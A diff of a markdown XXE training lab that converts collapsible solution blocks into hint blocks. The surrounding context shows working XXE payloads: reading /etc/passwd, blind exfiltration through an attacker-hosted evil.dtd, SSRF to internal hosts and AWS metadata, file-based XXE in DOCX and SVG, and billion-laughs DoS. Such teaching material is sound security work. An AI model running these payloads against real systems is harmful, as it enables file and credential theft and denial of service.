@@ -152,9 +152,7 @@ DoS through recursive entity expansion
 **Setup**: Start XXE Lab application  
 **Goal**: Read the `/etc/passwd` file
 
-<details>
-<summary>💡 Hint 1: Find the XML input</summary>
-
+:::hint 💡 Hint 1: Find the XML input
 Look for places where the application accepts XML:
 - File upload forms
 - API endpoints accepting XML
@@ -162,11 +160,9 @@ Look for places where the application accepts XML:
 
 Try changing Content-Type to `application/xml` on regular forms!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Basic XXE payload structure</summary>
-
+:::hint 💡 Hint 2: Basic XXE payload structure
 You need:
 1. XML declaration
 2. DOCTYPE with entity definition
@@ -181,11 +177,9 @@ Start with:
 <root></root>
 ```
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Entity syntax</summary>
-
+:::hint 💡 Hint 3: Entity syntax
 To define an external entity:
 ```xml
 <!ENTITY name SYSTEM "protocol://path">
@@ -193,11 +187,9 @@ To define an external entity:
 
 Then reference it with `&name;`
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Payload:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -224,7 +216,7 @@ Then reference it with `&name;`
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ```
 
-</details>
+:::
 
 ---
 
@@ -233,20 +225,16 @@ Then reference it with `&name;`
 **Setup**: Navigate to WebGoat XXE lesson  
 **Goal**: Extract data when no direct output is shown
 
-<details>
-<summary>💡 Hint 1: Understanding blind XXE</summary>
-
+:::hint 💡 Hint 1: Understanding blind XXE
 In blind XXE, the application doesn't return the entity content. You need to:
 1. Make the server connect to your server
 2. Include the data in the request
 
 You'll need an external server to receive data!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Parameter entities</summary>
-
+:::hint 💡 Hint 2: Parameter entities
 Regular entities might not work in DTDs. Use parameter entities:
 ```xml
 <!ENTITY % name "value">
@@ -254,11 +242,9 @@ Regular entities might not work in DTDs. Use parameter entities:
 
 Reference with `%name;` instead of `&name;`
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: DTD chaining</summary>
-
+:::hint 💡 Hint 3: DTD chaining
 You can load external DTDs:
 ```xml
 <!DOCTYPE foo [
@@ -269,11 +255,9 @@ You can load external DTDs:
 
 This loads and executes your remote DTD!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1: Create external DTD** (evil.dtd on your server):
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -308,7 +292,7 @@ This loads and executes your remote DTD!
 %error;
 ```
 
-</details>
+:::
 
 ---
 
@@ -317,9 +301,7 @@ This loads and executes your remote DTD!
 **Setup**: Find an XML upload or parser  
 **Goal**: Make internal HTTP requests
 
-<details>
-<summary>💡 Hint 1: HTTP protocol in XXE</summary>
-
+:::hint 💡 Hint 1: HTTP protocol in XXE
 XXE supports HTTP:
 ```xml
 <!ENTITY xxe SYSTEM "http://internal-site.com">
@@ -327,33 +309,27 @@ XXE supports HTTP:
 
 This makes the server fetch that URL!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Internal services</summary>
-
+:::hint 💡 Hint 2: Internal services
 Common internal services to target:
 - `http://localhost:8080` - Internal apps
 - `http://169.254.169.254` - AWS metadata
 - `http://192.168.1.1` - Internal network
 - `http://127.0.0.1:22` - Check if SSH is open
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Port scanning</summary>
-
+:::hint 💡 Hint 3: Port scanning
 You can check if ports are open by timing:
 - Fast response = open port
 - Slow/timeout = closed port
 
 Or check error messages!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **SSRF to internal service:**
 ```xml
 <?xml version="1.0"?>
@@ -387,7 +363,7 @@ Or check error messages!
 <!ENTITY xxe SYSTEM "gopher://internal.host:25">
 ```
 
-</details>
+:::
 
 ---
 
@@ -395,9 +371,7 @@ Or check error messages!
 
 **Goal**: Exploit XXE in DOCX/XLSX/SVG files
 
-<details>
-<summary>💡 Hint 1: File format structure</summary>
-
+:::hint 💡 Hint 1: File format structure
 Many file formats are just ZIP archives containing XML:
 - DOCX, XLSX, PPTX (Microsoft Office)
 - ODT, ODS (OpenDocument)
@@ -405,11 +379,9 @@ Many file formats are just ZIP archives containing XML:
 
 Unzip them to see the structure!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Injection points</summary>
-
+:::hint 💡 Hint 2: Injection points
 In DOCX, check:
 - `word/document.xml`
 - `word/_rels/document.xml.rels`
@@ -417,11 +389,9 @@ In DOCX, check:
 
 Add your DTD to these files!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: SVG XXE</summary>
-
+:::hint 💡 Hint 3: SVG XXE
 SVG supports XML entities:
 ```xml
 <!DOCTYPE svg [
@@ -432,11 +402,9 @@ SVG supports XML entities:
 </svg>
 ```
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **DOCX XXE:**
 1. Create a normal DOCX
 2. Unzip it: `unzip document.docx`
@@ -479,7 +447,7 @@ SVG supports XML entities:
 </sst>
 ```
 
-</details>
+:::
 
 ---
 
@@ -487,30 +455,24 @@ SVG supports XML entities:
 
 **Goal**: Combine multiple XXE techniques
 
-<details>
-<summary>🎯 Challenge Tasks</summary>
-
+:::hint 🎯 Hint 1
 1. Extract a binary file via XXE
 2. Bypass WAF filtering "SYSTEM"
 3. Execute commands through XXE
 4. Create a billion laughs DoS
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Advanced techniques</summary>
-
+:::hint 💡 Hint 2
 Think about:
 - UTF-16 encoding for bypass
 - HTML entities in entity names
 - Recursive entities
 - Alternative protocols
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 **Binary file extraction:**
 ```xml
 <!DOCTYPE foo [
@@ -554,7 +516,7 @@ Think about:
 <lolz>&lol5;</lolz>
 ```
 
-</details>
+:::
 
 ---
 
